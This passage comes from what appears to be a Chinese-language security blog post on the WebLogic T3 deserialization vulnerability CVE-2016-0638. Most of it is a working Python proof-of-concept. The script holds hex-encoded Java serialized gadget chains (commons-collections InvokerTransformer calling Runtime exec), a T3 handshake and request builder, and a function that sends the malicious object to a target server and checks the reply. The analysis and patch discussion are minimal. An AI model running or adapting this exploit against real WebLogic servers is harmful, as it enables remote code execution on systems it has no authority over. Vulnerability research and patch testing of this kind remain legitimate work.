73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78'</span>,<span class="string">'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870'</span>,<span class="string">'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078'</span>]</span><br><span class="line">VER_SIG=[<span class="string">'weblogic.jms.common.StreamMessageImpl'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">t3handshake</span><span class="params">(sock,server_addr)</span>:</span></span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    xx = bytes.fromhex(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>)</span><br><span class="line">    sock.send(xx)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildT3RequestObject</span><span class="params">(sock,rport)</span>:</span></span><br><span class="line">    data1 = <span class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></span><br><span class="line">    data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span>.format(<span class="string">'&#123;:04x&#125;'</span>.format(rport))</span><br><span class="line">    data3 = <span class="string">'1a7727000d3234322e323134'</span></span><br><span class="line">    data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">        xx = bytes.fromhex(d)</span><br><span class="line">        sock.send(xx)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEvilObjData</span><span class="params">(sock,data)</span>:</span></span><br><span class="line">    payload=<span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></span><br><span class="line">    payload+=data</span><br><span class="line">    payload+=<span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></span><br><span class="line">    payload = <span class="string">'%s%s'</span>%(<span class="string">'&#123;:08x&#125;'</span>.format(len(payload)//<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">    xx = bytes.fromhex(payload)</span><br><span class="line">    sock.send(xx)</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVul</span><span class="params">(res,index)</span>:</span></span><br><span class="line">    p=re.findall(VER_SIG[index], res, re.S)</span><br><span class="line">    <span class="keyword">if</span> len(p)&gt;<span class="number">0</span>:</span><br><span class="line">        logging.info(<span class="string">'[+]The target weblogic has a JAVA deserialization vulnerability:&#123;&#125;'</span>.format(VUL[index]))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[+]The target weblogic has a JAVA deserialization vulnerability:&#123;&#125;'</span>.format(VUL[index]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.info(<span class="string">'[-]Target weblogic not detected &#123;&#125;'</span>.format(VUL[index]))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[-]Target weblogic not detected &#123;&#125;'</span>.format(VUL[index]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(rip,rport,index)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">10</span>)</span><br><span class="line">    server_addr = (rip, rport)</span><br><span class="line">    t3handshake(sock,server_addr)</span><br><span class="line">    buildT3RequestObject(sock,rport)</span><br><span class="line">    rs=sendEvilObjData(sock,PAYLOAD[index])</span><br><span class="line">    checkVul(rs,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    dip = <span class="string">'172.16.100.97'</span></span><br><span class="line">    dport = <span class="number">7001</span></span><br><span class="line">    run(dip,dport,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>​                                                                                    <em>信息 9</em></p>
<h2 id="0x04-补丁"><a href="#0x04-补丁" class="headerlink" title="0x04 补丁"></a>0x04 补丁</h2><p>​    略。</p>
<p>​    需要注意的是，很快出现的CVE-2016-3510只是选择了<strong>weblogic.corba.utils.MarshalledObject</strong>就绕过了补丁。</p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2>
  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/posts/">Writing</a></li>
         
          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic-T3反序列化之二：-CVE-2016-0638"><span class="toc-number">1.</span> <span class="toc-text">Weblogic T3反序列化之二： CVE-2016-0638</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-漏洞描述"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞PoC"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 漏洞PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-补丁"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 参考</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/" target="_blank" rel="noopener"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&text=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&is_video=false&description=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=weblogic/Weblogic T3反序列化之二： CVE-2016-0638&body=Check out this article: http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&name=weblogic/Weblogic T3反序列化之二： CVE-2016-0638&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Homer
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/posts/">Writing</a></li>
         
          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<link rel="stylesheet" href="/lib/meslo-LG/styles.css">


<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>



    <!-- Google Analytics -->
    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-37473492-6', 'auto');
        ga('send', 'pageview');
    </script>



